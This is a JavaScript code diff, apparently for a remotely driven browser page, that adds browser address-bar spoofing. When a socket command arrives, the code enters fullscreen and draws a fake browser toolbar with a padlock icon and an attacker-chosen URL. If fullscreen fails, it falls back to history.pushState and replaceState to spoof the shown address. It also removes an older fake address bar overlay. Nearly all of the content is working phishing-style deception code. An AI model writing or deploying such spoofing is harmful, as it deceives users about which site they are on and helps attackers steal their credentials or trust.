@@ -45,67 +45,101 @@ socket.on("push_state", function(new_url){
   console.log(`Received push_state event: ${new_url}`)
   console.log(`Current URL before: ${window.location.href}`)
   
+  // Try fullscreen approach first
+  if (document.fullscreenEnabled) {
+    tryFullscreenSpoof(new_url)
+  } else {
+    // Fallback to history API attempts
+    tryHistoryAPISpoof(new_url)
+  }
+})
+
+function tryFullscreenSpoof(spoofed_url) {
+  console.log('Attempting fullscreen URL spoofing...')
+  
+  // Request fullscreen
+  document.documentElement.requestFullscreen().then(() => {
+    console.log('Entered fullscreen mode')
+    createFakeBrowserUI(spoofed_url)
+  }).catch((error) => {
+    console.log(`Fullscreen request failed: ${error.message}`)
+    tryHistoryAPISpoof(spoofed_url)
+  })
+}
+
+function createFakeBrowserUI(spoofed_url) {
+  // Remove any existing fake UI
+  const existing = document.getElementById('fake-browser-ui')
+  if (existing) existing.remove()
+  
+  // Create fake browser UI
+  const fakeUI = document.createElement('div')
+  fakeUI.id = 'fake-browser-ui'
+  fakeUI.style.cssText = `
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 80px;
+    background: linear-gradient(to bottom, #e8e8e8, #d0d0d0);
+    border-bottom: 1px solid #999;
+    z-index: 999999;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    display: flex;
+    flex-direction: column;
+  `
+  
+  fakeUI.innerHTML = `
+    <div style="display: flex; align-items: center; height: 40px; padding: 0 10px;">
+      <div style="display: flex; gap: 8px; margin-right: 15px;">
+        <div style="width: 12px; height: 12px; border-radius: 50%; background: #ff5f57;"></div>
+        <div style="width: 12px; height: 12px; border-radius: 50%; background: #ffbd2e;"></div>
+        <div style="width: 12px; height: 12px; border-radius: 50%; background: #28ca42;"></div>
+      </div>
+      <div style="flex: 1; margin: 0 10px;">
+        <div style="background: white; border: 1px solid #ccc; border-radius: 4px; padding: 6px 30px 6px 10px; font-size: 14px; position: relative;">
+          <span style="color: #666; margin-right: 8px;">🔒</span>
+          <span>${spoofed_url}</span>
+        </div>
+      </div>
+    </div>
+    <div style="display: flex; align-items: center; height: 40px; padding: 0 10px; background: #f0f0f0; border-top: 1px solid #ddd;">
+      <div style="display: flex; gap: 15px; font-size: 13px; color: #666;">
+        <span>← →</span>
+        <span>⟳</span>
+        <span>🏠</span>
+        <span>⭐</span>
+      </div>
+    </div>
+  `
+  
+  document.body.appendChild(fakeUI)
+  
+  // Adjust video position
+  const video = document.querySelector('video')
+  if (video) {
+    video.style.marginTop = '80px'
+    video.style.height = 'calc(100vh - 80px)'
+  }
+  
+  console.log(`Fake browser UI created showing: ${spoofed_url}`)
+}
+
+function tryHistoryAPISpoof(new_url) {
   try {
-    // Use history.pushState instead of replaceState, as it's sometimes less restricted
     history.pushState(null, '', new_url)
     console.log(`URL spoofed using pushState: ${window.location.href}`)
   } catch (error) {
     console.log(`pushState failed: ${error.message}`)
     
     try {
-      // Fallback to replaceState
       history.replaceState(null, '', new_url)
       console.log(`URL spoofed using replaceState: ${window.location.href}`)
     } catch (error2) {
       console.log(`Both pushState and replaceState failed: ${error2.message}`)
-      
-      // Try a different approach - create a fake address bar
-      console.log(`Creating visual URL spoof...`)
-      createFakeAddressBar(new_url)
+      console.log(`URL spoofing blocked by browser security - this is expected in modern browsers`)
     }
   }
-})
-
-// Function to create a fake address bar overlay
-function createFakeAddressBar(spoofed_url) {
-  // Remove any existing fake address bar
-  const existing = document.getElementById('fake-address-bar')
-  if (existing) existing.remove()
-  
-  // Create fake address bar
-  const fakeBar = document.createElement('div')
-  fakeBar.id = 'fake-address-bar'
-  fakeBar.style.cssText = `
-    position: fixed;
-    top: 0;
-    left: 0;
-    right: 0;
-    height: 35px;
-    background: #f0f0f0;
-    border-bottom: 1px solid #ccc;
-    z-index: 999999;
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-    font-size: 14px;
-    display: flex;
-    align-items: center;
-    padding: 0 10px;
-  `
-  
-  fakeBar.innerHTML = `
-    <span style="margin-right: 10px;">🔒</span>
-    <span style="background: white; padding: 5px 10px; border-radius: 15px; flex: 1;">${spoofed_url}</span>
-  `
-  
-  document.body.appendChild(fakeBar)
-  
-  // Adjust video position to account for fake bar
-  const video = document.querySelector('video')
-  if (video) {
-    video.style.marginTop = '35px'
-    video.style.height = 'calc(100vh - 35px)'
-  }
-  
-  console.log(`Fake address bar created showing: ${spoofed_url}`)
 }
 
 socket.on("copy_to_clipboard", function(data){
